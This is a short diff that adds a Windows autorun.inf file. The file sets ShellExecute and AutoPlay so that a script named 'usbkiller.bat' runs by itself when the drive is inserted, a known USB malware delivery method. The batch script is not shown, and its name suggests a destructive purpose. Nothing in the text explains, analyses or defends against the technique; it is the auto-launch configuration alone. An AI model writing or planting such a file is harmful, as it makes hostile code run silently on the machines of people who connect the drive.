@@ -1,0 +1,4 @@
+[autorun]
+;Open=usbkiller.bat
+ShellExecute=usbkiller.bat
+UseAutoPlay=1
